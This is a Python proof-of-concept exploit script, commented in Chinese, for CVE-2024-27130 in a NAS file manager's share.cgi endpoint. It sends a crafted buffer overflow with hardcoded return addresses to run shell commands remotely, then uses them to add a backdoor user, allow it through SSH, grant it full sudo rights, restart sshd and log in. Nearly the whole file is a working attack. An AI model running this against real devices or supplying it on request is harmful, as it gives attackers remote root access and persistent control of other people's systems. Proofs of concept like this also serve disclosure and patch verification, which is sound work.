import argparse
import os
import requests
import urllib3

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def parse_arguments():
    """
    解析命令行参数，获取目标主机和共享 ID。
    """
    parser = argparse.ArgumentParser(
        prog='PoC',
        description='PoC for CVE-2024-27130',
        usage="Obtain an 'ssid' by requesting a NAS user to share a file to you."
    )
    parser.add_argument('host', help='目标主机地址')
    parser.add_argument('ssid', help='共享文件的 ssid')
    args = parser.parse_args()
    return args

def make_random_password():
    """
    生成一个随机的 8 位密码，包含大写字母和数字。
    """
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(chars[c % len(chars)] for c in os.urandom(8))

def execute_command(args, cmd):
    """
    通过目标漏洞执行命令。
    """
    print(f"Executing command: '{cmd}'")

    # 构造缓冲区，包含命令和漏洞利用的特定偏移量
    buf = cmd
    buf += b'A' * (4082 - len(buf))
    buf += (0x54140508).to_bytes(4, 'little')  # delimiter
    buf += (0x54140508).to_bytes(4, 'little')  # r0 and r3
    buf += (0x54140508).to_bytes(4, 'little')
    buf += (0x54140508).to_bytes(4, 'little')  # r7
    buf += (0x73af5148).to_bytes(4, 'little')  # pc

    # 构造请求 payload
    payload = {
        'ssid': args.ssid,
        'func': 'get_file_size',
        'total': '1',
        'path': '/',
        'name': buf
    }

    # 发送 POST 请求执行命令
    requests.post(
        f"https://{args.host}/cgi-bin/filemanager/share.cgi",
        verify=False,
        data=payload,
        timeout=2
    )

def main():
    # 解析参数并生成随机密码
    args = parse_arguments()
    password = make_random_password()

    # 执行特定命令，利用漏洞在目标系统上创建用户并添加权限
    execute_command(args, f"/../../../../usr/local/bin/useradd -p \"$(openssl passwd -6 {password})\" watchtowr  #".encode('ascii'))
    execute_command(args, b"/bin/sed -i -e 's/AllowUsers /AllowUsers watchtowr /' /etc/config/ssh/sshd_config # ")
    execute_command(args, b"/../../../../bin/echo watchtowr ALL=\(ALL\) ALL >> /usr/etc/sudoers # ")
    execute_command(args, b"/../../../../usr/bin/killall -SIGHUP sshd # ")

    # 提示用户新用户信息
    print(f"Created new user OK. Log in with password '{password}' when prompted.")

    # 使用 SSH 登录到目标主机
    os.system(f'ssh watchtowr@{args.host}')

if __name__ == "__main__":
    main()
